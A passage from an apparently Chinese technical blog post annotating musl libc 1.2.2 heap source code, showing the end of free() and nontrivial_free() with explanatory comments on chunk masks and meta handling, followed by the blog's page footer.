&gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">		<span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">		<span class="keyword">if</span> (len) &#123;</span><br><span class="line">			<span class="keyword">int</span> e = errno;</span><br><span class="line">			madvise(base, len, MADV_FREE);</span><br><span class="line">			errno = e;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 在meta-&gt;free_mask进行记录,表示该chunk被释放 */</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">		<span class="keyword">uint32_t</span> mask = freed | avail; <span class="comment">/* mask=所有被释放的chunk+现在可用的chunk */</span></span><br><span class="line">		assert(!(mask&amp;self)); <span class="comment">/* 对应:要释放的chunk既不能在freed中,也不在avail中 */</span></span><br><span class="line">		<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (!MT)</span><br><span class="line">			g-&gt;freed_mask = freed+self;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed) <span class="comment">/* 如遇多线程使用原子操作 */</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx); <span class="comment">/* 处理meta */</span></span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="keyword">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>nontrivial_free：设置关于属于该 group 的 meta</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">        <span class="comment">/* 如果group中所有chunk要么freed要么avail,并且g可以被释放,那么就要回收掉整个meta */</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123; <span class="comment">/* 检查改meta是否合法 */</span></span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                <span class="comment">/* 如果g是队列中开头的meta,那么将它弹出队列后,要激活后一个meta */</span></span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g); <span class="comment">/* meta已经取出,现在要释放这个meta */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">        <span class="comment">/* 如果mask==0,也就是这个group中所有的chunk都被分配出去了 */</span></span><br><span class="line">		assert(sc &lt; <span class="number">48</span>); <span class="comment">/* 判断sc是否合法 */</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://eur1ka.github.io/51092.html">musl-1.2.2堆内存分配源码分析 | eur1ka’s blog</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">256</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">143</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">52:25</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
